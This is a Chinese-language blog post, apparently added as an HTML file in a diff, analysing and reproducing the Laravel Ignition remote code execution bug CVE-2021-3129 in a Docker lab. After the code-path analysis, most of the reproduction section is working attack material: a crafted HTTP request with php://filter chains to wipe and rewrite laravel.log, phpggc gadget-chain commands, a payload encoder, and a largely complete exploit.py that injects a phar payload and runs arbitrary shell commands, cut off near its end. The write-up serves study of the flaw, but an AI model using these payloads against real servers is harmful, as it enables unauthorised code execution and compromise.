@@ -1,0 +1,663 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>Laravel Debug RCE（CVE-2021-3129）分析 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Laravel Debug RCE（CVE-2021-3129）分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-14 13:39" pubdate>
+        July 14, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Laravel Debug RCE（CVE-2021-3129）分析</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x00简介"><a class="header-anchor" href="#0x00简介">🍭</a>0x00简介</h2>
+<p>Laravel是一套简洁、优雅的PHP Web开发框架(PHP Web Framework)。它可以让你从面条一样杂乱的代码中解脱出来；它可以构建一个完美的网络APP，而且每行代码都可以简洁、富于表达力。</p>
+<h2 id="0x01漏洞概述"><a class="header-anchor" href="#0x01漏洞概述">🍭</a>0x01漏洞概述</h2>
+<p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p>
+<h2 id="0x02影响版本"><a class="header-anchor" href="#0x02影响版本">🍭</a>0x02影响版本</h2>
+<p>Laravel &lt;= 8.4.2<br>
+Ignition &lt;= 2.5.1</p>
+<h2 id="0x03环境搭建"><a class="header-anchor" href="#0x03环境搭建">🍭</a>0x03环境搭建</h2>
+<pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SNCKER/</span>CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>
+cd CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span>
+docker-compose up -d<span class="hljs-regexp">//</span>拉取镜像</code></pre>
+<p>建完访问</p>
+<p><img src="/2021/07/14/rce-0/1.jpg" srcset="/img/loading.gif" alt="1"></p>
+<h2 id="0x04漏洞分析"><a class="header-anchor" href="#0x04漏洞分析">🍭</a>0x04漏洞分析</h2>
+<p>为复现变量未定义时出现的报错情况，漏洞文件在resource/views/ hello.blade.php中设置一个简单的模板</p>
+<p><img src="/2021/07/14/rce-0/4.jpg" srcset="/img/loading.gif" alt="4"></p>
+<p>并在routes/web.php中添加路由</p>
+<p><img src="/2021/07/14/rce-0/5.jpg" srcset="/img/loading.gif" alt="5"></p>
+<p>访问出现变量未定义的报错信息</p>
+<p><img src="/2021/07/14/rce-0/3.jpg" srcset="/img/loading.gif" alt="3"></p>
+<p>抓包</p>
+<p><img src="/2021/07/14/rce-0/6.jpg" srcset="/img/loading.gif" alt="6"></p>
+<p>请求的接口为/_ignition/execute-solution，以此入手，审计代码。搜索路由</p>
+<p><img src="/2021/07/14/rce-0/7.jpg" srcset="/img/loading.gif" alt="7"></p>
+<p>对应的处理类为ExecuteSolutionController，此处类对象被当做函数调用，因此会调用ExecuteSolutionController类的__invoke方法。</p>
+<p><img src="/2021/07/14/rce-0/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<p>先调用ExecuteSolutionRequest-&gt;getRunnableSolution()获取solution对象，随后调用solution对象的run方法，先跟进ExecuteSolutionRequest的getRunnableSolution方法</p>
+<p><img src="/2021/07/14/rce-0/9.jpg" srcset="/img/loading.gif" alt="9"></p>
+<p><code>solution对象来自getSolution方法的返回，并且必须是RunnableSolution类的实例</code>==&gt;<code>solution对象的类必须是RunnableSolution类的子类</code>,在getSolution方法中，类来源于传递的solution参数</p>
+<p><img src="/2021/07/14/rce-0/10.jpg" srcset="/img/loading.gif" alt="10"></p>
+<p>MakeView VariableOptionalSolution恰好继承于RunableSolution接口，符合上述条件。跟进到MakeViewVariableOptionalSolution的run方法，</p>
+<p><img src="/2021/07/14/rce-0/11.jpg" srcset="/img/loading.gif" alt="11"></p>
+<p><code>$parameters</code>参数被传递到makeOptional参数处理，并且viewFile参数对应的文件会被file_get_contents方法读取，</p>
+<p><img src="/2021/07/14/rce-0/12.jpg" srcset="/img/loading.gif" alt="12"></p>
+<p>并将<code>$username</code>替换为<code>$username ? ‘’</code>，后续会做Token化比对，因此没办法直接控制variableName参数。但由于viewFile可控，且经过file_get_contents方法处理，如果能够上传或者写入Phar文件，是可以利用phar://实现反序列化的。</p>
+<h2 id="0x05漏洞利用"><a class="header-anchor" href="#0x05漏洞利用">🍭</a>0x05漏洞利用</h2>
+<p>现在唯一可控部分内容的文件是laravel的日志文件。通过本漏洞的路由请求一个不存在的文件名作为<code>viewFile</code>的值，就可以把这个值保存到log文件中。此时就算能控制一部分日志内容，但可控内容前后有日期、堆栈信息等太多不可控内容，没办法直接写入Phar文件。这时候需要利用php://filter伪协议对文件内容进行多种编解码。</p>
+<blockquote>
+<p>利用base64解码能够在有一部分干扰内容情况下仍然解码成功，但如果有=等字符则可干扰正常解码。利用convert.iconv.utf-16le.utf-8，可以将其他干扰内容转换成非ascii，而非ascii字符再经过base64解码即可变成空。但utf-16le编码中会有一些空字符，传递到file_get_contents方法中会报错。因此还需要利用convert.quoted-printable-encode可以将空字符编码为=00，再使用与之相对的decode方法即可解决这个问题。</p>
+</blockquote>
+<p>整体的流程：<code>ExecuteSolutionController-&gt;__invoke() -&gt;  ExecuteSolutionRequest -&gt; getRunnableSolution() -&gt; getSolution()  -&gt; MakeViewVariableOptionalSolution-&gt;run()</code></p>
+<h2 id="0x06漏洞复现"><a class="header-anchor" href="#0x06漏洞复现">🍭</a>0x06漏洞复现</h2>
+<h4 id="方式一"><a class="header-anchor" href="#方式一">🍭</a>方式一</h4>
+<h5 id="清空laravel-log"><a class="header-anchor" href="#清空laravel-log">🍭</a>清空laravel.log</h5>
+<p>抓包，传入如下内容</p>
+<pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 192.x.x.x:8888
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Referer</span>: http://192.x.x.x:8888/_ignition/execute-solution
+<span class="hljs-attribute">Content-Type</span>: application/json
+<span class="hljs-attribute">Content-Length</span>: 320
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+
+&#123;
+	&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,
+	&quot;parameters&quot;:&#123;
+		&quot;variableName&quot;: &quot;username&quot;,
+		&quot;viewFile&quot;: &quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=xxx/storage/logs/laravel.log&quot;
+	&#125;
+&#125;</code></pre>
+<p>另一种方法是viewfile值为<code>php://filter/read=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=xxx/storage/logs/laravel.log</code></p>
+<p>但要执行多次才能清空日志。因为多次base64解码出现一些非预期的问题，如果在某次decode时，<code>=</code>号后面出现了别的base64字符，php会报Warning。且由于laravel开启了debug模式，所以会触发<code>Ignition</code>生成错误页面，导致decode后的字符没有成功写入。</p>
+<h5 id="发送偶数文件名的请求"><a class="header-anchor" href="#发送偶数文件名的请求">🍭</a>发送偶数文件名的请求</h5>
+<p>发送一个viewFile值为11的请求即可(原因如下面坑点3)</p>
+<h5 id="向日志中插入Payload"><a class="header-anchor" href="#向日志中插入Payload">🍭</a>向日志中插入Payload</h5>
+<p>从phpggc里拿一条laravel中存在的拓展的链子生成payload（phpggc用法在另一篇文章说明）</p>
+<pre><code class="hljs awk">.<span class="hljs-regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o php:<span class="hljs-regexp">//</span>output</code></pre>
+<p>因为保存到log中的POC有许多垃圾字符，如当写入POCPOCPOC时会有三处字符显示</p>
+<p><img src="/2021/07/14/rce-0/15.jpg" srcset="/img/loading.gif" alt="15"></p>
+<p>且POC的两侧都有垃圾字符。因此需要尝试把垃圾字符去掉，只保留我们的POC。</p>
+<h6 id="tips："><a class="header-anchor" href="#tips：">🍭</a>tips：</h6>
+<p><code>utf-16le</code>是两个字节代表一个字符（le是指小端模式），<code>utf-8</code>是一个字节代表一个字符。利用这个特性，我们可以把一串<code>utf8</code>字符当作<code>utf16</code>，在这样转换时字符串就会变成非ascii的乱码。由于这些是非ascii字符，因此使用base64解码时会被清空。php过滤器中刚好存在这些过滤器，即<code>php://filter/read=convert.iconv.utf-16le.utf-8/resource=xxx.txt</code>，是指把xxx.txt的内容视作<code>utf16</code>，并将其转换成<code>utf8</code>。</p>
+<p>我们可以先把POC base64编码（获取POC链时）</p>
+<pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w0</code></pre>
+<p>然后进行utf-8转utf-16le。在读log文件时先进行utf-16le转utf-8，这样之前的字符都会变成乱码而POC不会，然后使用base64解码，就会去掉乱码，只剩下POC明文。<strong>但utf-16le编码会在utf-8的字符后加上一个<code>\00</code>空字节</strong>，在utf-8转utf-16le需要在每个字符<strong>后面</strong>加上一个<code>\00</code>字节。这里需要用到<code>convert.quoted-printable-encode</code>过滤器，它可以把所有的不可见字符转换成<code>=xx</code>，比如把<code>\00</code>转换成<code>=00</code>。</p>
+<p>理一下思路：POC==&gt;BASE64==&gt;把<code>\00</code>转换成<code>=00</code>==&gt;utf-16le.utf-8</p>
+<p>base64编码在生成POC链时就完成，后面两步写个php或者py进行编码</p>
+<p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode</code></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$filename = <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-encode|convert.iconv.utf-8.utf-16le/resource=1.txt&quot;</span>; <span class="hljs-comment">//1.txt是base64编码后的POC</span>
+<span class="hljs-keyword">echo</span> $filename;
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>PS：BASE64==&gt;把<code>\00</code>转换成<code>=00</code>==&gt;utf-16le.utf-8过程也可脚本实现</p>
+<pre><code class="hljs coffeescript"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex
+payload = <span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-comment"># base64 payload</span>
+armedPayload = <span class="hljs-string">&#x27;&#x27;</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:
+    i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()
+    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span>
+<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;123456789012345&quot;</span>+armedPayload)<span class="hljs-comment">#前面加15个字符，对应坑点1</span></code></pre>
+<p>编码之后：</p>
+<p><img src="/2021/07/14/rce-0/16.jpg" srcset="/img/loading.gif" alt="16"></p>
+<p>读取时再逆向解码：<code>php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=xxxx/laravel.log</code>就可还原POC链。</p>
+<h5 id="触发Phar反序列化"><a class="header-anchor" href="#触发Phar反序列化">🍭</a>触发Phar反序列化</h5>
+<p><code>phar:///xxxx/laravel/storage/logs/laravel.log</code></p>
+<p><img src="/2021/07/14/rce-0/17.jpg" srcset="/img/loading.gif" alt="17"></p>
+<h5 id="此方法的坑点："><a class="header-anchor" href="#此方法的坑点：">🍭</a>此方法的坑点：</h5>
+<ol>
+<li>前面提到<code>laravel.log</code>文件中有三处会显示payload，其中最后一处当payload过长时，从第十六个字符开始都会省略成<code>...</code>，因此我们要保证第十六个字符不在<code>=</code>的后两位，比如<code>=0.</code>、<code>=..</code>会导致<code>quoted-printable-decode</code>过滤器返回空结果。因此需要在payload前填充15个字符，让第三处不显示payload。</li>
+<li>由于<code>convert.quoted-printable-decode</code>会对<code>=</code>当作特殊字符，因此base64结尾可能有的<code>=</code>会造成解析出错，因此需要手动把base64编码后的<code>=</code>替换成<code>=3D</code>，对于base64编码中的<code>+</code>最好也替换成<code>=2B</code>。</li>
+<li>发送poc之后，使用过滤器来解析log时，如果laravel.log最终的字节数为奇数，那么在<code>utf-16le-&gt;utf-8</code>时又会抛出一条新日志，这样后续的base64  decode就会失败了。由于我们的poc会在log中出现两次，因此所有poc字符数必然是偶数个，影响log文件字符数奇偶的只能是log框架文本本身的字符数。只要在我们发送poc之前提前发送一个偶数文件名的请求，这样最终的log中就会有两次log框架本身的字符，因此必为偶数。</li>
+</ol>
+<h4 id="方式二"><a class="header-anchor" href="#方式二">🍭</a>方式二</h4>
+<p>直接在下载的CVE中修改exploit.py中的url为自己的漏洞地址，把exp和phpggc放在同一目录，使用python3执行exp</p>
+<p><img src="/2021/07/14/rce-0/13.jpg" srcset="/img/loading.gif" alt="13"></p>
+<p>PS：</p>
+<blockquote>
+<p>phpggc在github上有<br>
+<code>git clone https://github.com/ambionics/phpggc.git</code>(需要给phpggc执行权限)<br>
+docker-compose用完记得关<br>
+<img src="/2021/07/14/rce-0/14.jpg" srcset="/img/loading.gif" alt="14"></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://exploit.py">exploit.py</a></p>
+<pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/python3</span>
+
+import requests as req
+import os, uuid
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span>:</span>
+    __gadget_chains = &#123;
+        <span class="hljs-string">&quot;monolog_rce1&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,
+        <span class="hljs-string">&quot;monolog_rce2&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,
+        <span class="hljs-string">&quot;monolog_rce3&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,
+    &#125;  <span class="hljs-comment"># phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力</span>
+
+    __delimiter_len = <span class="hljs-number">8</span>  <span class="hljs-comment"># 定界符长度</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__vul_check</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>
+        resp = req.get(<span class="hljs-keyword">self</span>.__url, verify=False)
+        <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">405</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;laravel&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.<span class="hljs-symbol">text:</span>
+            <span class="hljs-keyword">return</span> False
+        <span class="hljs-keyword">return</span> True
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__payload_send</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, payload)</span></span><span class="hljs-symbol">:</span>
+        header = &#123;
+            <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>
+        &#125;
+        data = &#123;
+            <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,
+            <span class="hljs-string">&quot;parameters&quot;</span>: &#123;
+                <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;cve20213129&quot;</span>,
+                <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>
+            &#125;
+        &#125;
+        data[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = payload
+        resp = req.post(<span class="hljs-keyword">self</span>.__url, headers=header, json=data, verify=False)
+        <span class="hljs-comment"># print(resp.text)</span>
+        <span class="hljs-keyword">return</span> resp
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__command_handler</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, command)</span></span><span class="hljs-symbol">:</span>
+        <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
+<span class="hljs-string">        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。</span>
+<span class="hljs-string">        &quot;</span><span class="hljs-string">&quot;&quot;</span>
+
+        <span class="hljs-keyword">self</span>.__delimiter = str(uuid.uuid1())[<span class="hljs-symbol">:self</span>.__delimiter_len]  <span class="hljs-comment"># 定界符用于定位页面中命令执行结果的位置。</span>
+        <span class="hljs-comment"># print(delimiter)</span>
+        command = <span class="hljs-string">&quot;echo %s &amp;&amp; %s &amp;&amp; echo %s&quot;</span> % (<span class="hljs-keyword">self</span>.__delimiter, command, <span class="hljs-keyword">self</span>.__delimiter)
+        <span class="hljs-comment"># print(command)</span>
+
+        escaped_chars = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>]  <span class="hljs-comment"># 我只想到这么多，可自行添加。</span>
+        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-symbol">escaped_chars:</span>
+            command = command.replace(c, <span class="hljs-string">&#x27;\\&#x27;</span> + c)
+        <span class="hljs-comment"># print(command)</span>
+        <span class="hljs-keyword">return</span> command
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__clear_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(
+            <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__gen_payload</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, gadget_chain)</span></span><span class="hljs-symbol">:</span>
+        gen_shell = <span class="hljs-keyword">self</span>.__gadget_chains[gadget_chain] % (<span class="hljs-keyword">self</span>.__command)
+        <span class="hljs-comment"># print(gen_shell)</span>
+        os.system(gen_shell)
+        with open(<span class="hljs-string">&#x27;payload.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as <span class="hljs-symbol">f:</span>
+            payload = f.read().replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;a&#x27;</span>  <span class="hljs-comment"># 添加一个字符使得两个完整的payload总是只有一个可以正常解码</span>
+        os.system(<span class="hljs-string">&quot;rm payload.txt&quot;</span>)
+        <span class="hljs-comment"># print(payload)</span>
+        <span class="hljs-keyword">return</span> payload
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decode_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(
+            <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__unserialize_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__rce</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>
+        text = <span class="hljs-keyword">self</span>.__unserialize_log().text
+        <span class="hljs-comment"># print(text)</span>
+
+        echo_find = text.find(<span class="hljs-keyword">self</span>.__delimiter)
+        <span class="hljs-comment"># print(echo_find)</span>
+        <span class="hljs-keyword">if</span> echo_find &gt;= <span class="hljs-number">0</span><span class="hljs-symbol">:</span>
+            <span class="hljs-keyword">return</span> text[echo_find + <span class="hljs-keyword">self</span>.__delimiter_len + <span class="hljs-number">1</span>: text.find(<span class="hljs-keyword">self</span>.__delimiter, echo_find + <span class="hljs-number">1</span>)]
+        <span class="hljs-symbol">else:</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[-] RCE echo is not found.&quot;</span>
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>
+        <span class="hljs-keyword">for</span> gadget_chain <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.__gadget_chains.keys()<span class="hljs-symbol">:</span>
+            print(<span class="hljs-string">&quot;[*] Try to use %s for exploitation.&quot;</span> % (gadget_chain))
+            <span class="hljs-keyword">self</span>.__clear_log()
+            <span class="hljs-keyword">self</span>.__clear_log()
+            <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">2</span>)
+            <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-keyword">self</span>.__gen_payload(gadget_chain))
+            <span class="hljs-keyword">self</span>.__decode_log()
+            print(<span class="hljs-string">&quot;[*] Result:&quot;</span>)
+            print(<span class="hljs-keyword">self</span>.__rce())
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, target, command)</span></span><span class="hljs-symbol">:</span>
+        <span class="hljs-keyword">self</span>.target = target
+        <span class="hljs-keyword">self</span>.__url = req.compat.urljoin(target, <span class="hljs-string">&quot;_ignition/execute-solution&quot;</span>)
+        <span class="hljs-keyword">self</span>.__command = <span class="hljs-keyword">self</span>.__command_handler(command)
